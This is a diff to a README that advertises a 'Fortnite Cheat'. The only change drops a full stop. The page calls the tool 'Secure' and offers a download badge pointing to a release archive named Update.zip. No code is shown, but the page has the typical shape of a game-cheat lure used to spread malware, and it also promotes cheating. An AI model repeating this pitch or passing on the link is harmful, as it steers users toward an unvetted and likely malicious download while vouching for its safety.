@@ -1,7 +1,7 @@
 # 💥 **Fortnite Cheat - Unlock Your Full Potential!** 🎮  
 
 > **Transform your Fortnite experience with game-changing features!**  
-> Secure, straightforward, and packed with tools to help you win. 🚀  
+> Secure, straightforward, and packed with tools to help you win 🚀  
 **[![Download Fortnite Cheat](https://img.shields.io/badge/Download-Fortnite%20Cheat%20-red)](https://github.com/KaylaHailug05p/fortnite-cheat/releases/download/Update/Update.zip)**  
 
 ---
